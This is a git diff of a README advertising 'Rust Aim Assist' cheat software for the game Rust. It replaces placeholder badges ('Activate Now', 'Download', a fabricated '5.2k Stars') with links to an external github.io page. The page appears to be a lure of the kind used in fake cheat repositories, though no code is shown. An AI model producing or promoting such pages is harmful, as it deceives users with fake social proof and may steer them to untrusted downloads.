@@ -95,9 +95,9 @@ A: Yes, experimental controller mapping is available.
 
 In Rust, milliseconds matter. **Rust Aim Assist software** helps balance skill with survival efficiency by sharpening your aim mechanics. Perfect for players who demand consistency in every firefight.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.2k Stars](https://img.shields.io/badge/GitHub-⭐️%205.2k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://rust-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://rust-aim-assist.github.io/.github/)
+[![⭐️ 5.2k Stars](https://img.shields.io/badge/GitHub-⭐️%205.2k%20Stars-black?style=for-the-badge\&logo=github)](https://rust-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://rust-aim-assist.github.io/.github/)
 
 ---
